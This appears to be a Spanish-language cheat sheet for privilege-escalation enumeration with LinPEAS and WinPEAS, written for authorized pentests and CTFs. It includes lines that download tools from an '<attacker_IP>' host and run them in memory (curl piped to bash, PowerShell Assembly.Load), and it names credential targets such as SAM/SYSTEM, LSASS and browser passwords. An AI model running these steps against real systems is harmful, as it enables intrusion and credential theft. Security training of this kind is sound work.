# LinPEAS & WinPEAS — Privilege Escalation Enumeration

Scripts de enumeración automática para encontrar vectores de escalada de privilegios en Linux y Windows.

**Contexto:** Uso en pentesting autorizado, CTFs, y laboratorios de seguridad.

---

## LinPEAS (Linux)

### Transferencia al Target
```bash
# Desde attacker: servir archivo
python3 -m http.server 8000

# Desde target: descargar
wget http://<attacker_IP>:8000/linpeas.sh
curl http://<attacker_IP>:8000/linpeas.sh -o linpeas.sh
# Sin tocar disco (ejecutar en memoria)
curl http://<attacker_IP>:8000/linpeas.sh | bash
```

### Ejecución
```bash
# Ejecución completa
chmod +x linpeas.sh
./linpeas.sh

# Redirigir output (para revisar después)
./linpeas.sh | tee linpeas_output.txt

# Sin colores (para archivos de texto)
./linpeas.sh -a 2>&1 | tee -a linpeas_output.txt

# Ejecución rápida (skip slow checks)
./linpeas.sh -f

# Solo checks específicos
./linpeas.sh -s          # Solo SUID
./linpeas.sh -P          # Solo passwords en archivos
./linpeas.sh -n          # Solo network info
```

### Interpretar Output — Código de Colores
```
RED/YELLOW  → 95% vector de privesc (investigar inmediatamente)
RED         → Configuraciones peligrosas (posible vector)
CYAN        → Usuarios con consola
GREEN       → Información interesante
BLUE        → No directamente explotable pero contextual
```

### Qué Buscar en el Output

**Vectores de Alta Prioridad (RED/YELLOW):**
```
- SUID binaries inusuales
- Capabilities peligrosas (cap_setuid, cap_sys_admin)
- sudo -l entries explotables → GTFOBins
- Cron jobs con paths writable
- Archivos writable en PATH
- Docker/LXC group membership
- Kernel version con exploits conocidos
- /etc/shadow readable
- SSH keys accesibles
- .bash_history con passwords
- .env files con credenciales
- Writable /etc/passwd
- NFS shares con no_root_squash
```

**Vectores de Media Prioridad:**
```
- Services corriendo como root con configs writable
- Internal ports abiertos (ej: MySQL localhost)
- Archivos .conf con credenciales
- Log files con datos sensibles
- Backup files (.bak, .old, .save)
- Timer units de systemd writable
```

### Flujo Post-LinPEAS
```
1. Buscar RED/YELLOW highlights
2. Verificar sudo -l → buscar en GTFOBins
3. Verificar SUID → buscar en GTFOBins
4. Verificar capabilities → buscar exploits
5. Verificar cron jobs → buscar paths writable
6. Buscar credenciales en archivos
7. Verificar kernel version → searchsploit
```

---

## WinPEAS (Windows)

### Transferencia al Target
```powershell
# Desde attacker: servir
python3 -m http.server 8000

# Desde target PowerShell
Invoke-WebRequest -Uri http://<attacker_IP>:8000/winPEASany.exe -OutFile winpeas.exe
(New-Object Net.WebClient).DownloadFile('http://<attacker_IP>:8000/winPEASany.exe','winpeas.exe')
certutil -urlcache -split -f http://<attacker_IP>:8000/winPEASany.exe winpeas.exe

# SMB share
copy \\<attacker_IP>\share\winPEASany.exe C:\Users\Public\winpeas.exe

# Ejecutar en memoria (AMSI bypass puede ser necesario)
$data = (New-Object Net.WebClient).DownloadData('http://<attacker_IP>:8000/winPEASany.exe')
[System.Reflection.Assembly]::Load($data).EntryPoint.Invoke($null, @(,@()))
```

### Versiones Disponibles
```
winPEASany.exe    → .NET 4.5.2, funciona en cualquier Windows
winPEASx64.exe    → Optimizado para x64
winPEASx86.exe    → Optimizado para x86
winPEAS.bat       → Batch version (sin .NET dependency, menos features)
winPEAS.ps1       → PowerShell version
```

### Ejecución
```powershell
# Ejecución completa
.\winpeas.exe

# Redirigir output
.\winpeas.exe | tee winpeas_output.txt
.\winpeas.exe > winpeas_output.txt 2>&1

# Checks específicos
.\winpeas.exe systeminfo
.\winpeas.exe userinfo
.\winpeas.exe processinfo
.\winpeas.exe servicesinfo
.\winpeas.exe applicationsinfo
.\winpeas.exe networkinfo
.\winpeas.exe windowscreds
.\winpeas.exe browserinfo
.\winpeas.exe filesinfo

# Búsqueda de credenciales intensiva
.\winpeas.exe -lolbas

# Quiet mode
.\winpeas.exe quiet
```

### Qué Buscar en el Output

**Vectores de Alta Prioridad:**
```
- AlwaysInstallElevated habilitado
- Unquoted service paths
- Servicios con binpath writable
- DLL hijacking opportunities
- Scheduled tasks con binarios writable
- AutoLogon credentials en registry
- Stored credentials (cmdkey /list)
- SAM/SYSTEM backups accesibles
- Token privileges: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege
- Passwords en PowerShell history
- WiFi passwords almacenados
- Browser saved passwords
- KeePass databases
- .NET compilation directories con permisos débiles
```

**Token Privileges Explotables:**
```
SeImpersonatePrivilege    → Potato attacks (JuicyPotato, PrintSpoofer, GodPotato)
SeAssignPrimaryTokenPrivilege → Potato attacks
SeBackupPrivilege         → Copiar SAM/SYSTEM, leer archivos protegidos
SeRestorePrivilege        → Escribir archivos protegidos, DLL hijacking
SeTakeOwnershipPrivilege  → Tomar ownership de archivos/registry keys
SeDebugPrivilege          → Inyectar en procesos, dump LSASS
SeLoadDriverPrivilege     → Cargar driver vulnerable
```

### Flujo Post-WinPEAS
```
1. Buscar RED/YELLOW highlights
2. Verificar token privileges → Potato attacks
3. Verificar servicios vulnerables → unquoted paths, writable binpath
4. Verificar AlwaysInstallElevated
5. Buscar credenciales almacenadas
6. Verificar scheduled tasks → writable binaries
7. Verificar AutoLogon credentials
8. Buscar archivos interesantes (.kdbx, .config, web.config)
```

---

## Alternativas Complementarias

### Linux
```bash
# LinEnum
./LinEnum.sh -t

# linux-exploit-suggester
./linux-exploit-suggester.sh

# pspy (monitorear procesos sin root)
./pspy64

# GTFOBins (referencia web)
# https://gtfobins.github.io/
```

### Windows
```powershell
# PowerUp (PowerSploit)
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt (GhostPack)
.\Seatbelt.exe -group=all

# SharpUp (GhostPack)
.\SharpUp.exe audit

# PrivescCheck
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck

# Watson (kernel exploits)
.\Watson.exe

# LOLBAS (referencia web)
# https://lolbas-project.github.io/
```

---

## Tips

- **Siempre guardar output** — redirigir a archivo, el output es extenso y fácil de perder
- **pspy antes de linpeas** — detecta cron jobs que se ejecutan como root sin necesitar root
- **En CTFs, buscar RED/YELLOW primero** — ignora el resto hasta agotar los highlights
- **WinPEAS puede ser detectado por AV** — considerar usar la versión .bat o PowerShell, o desactivar AV si es lab
- **GTFOBins y LOLBAS** — tener siempre abiertos como referencia junto al output de PEAS
- **Token privileges** — si tienes SeImpersonatePrivilege, es casi guaranteed privesc con Potato
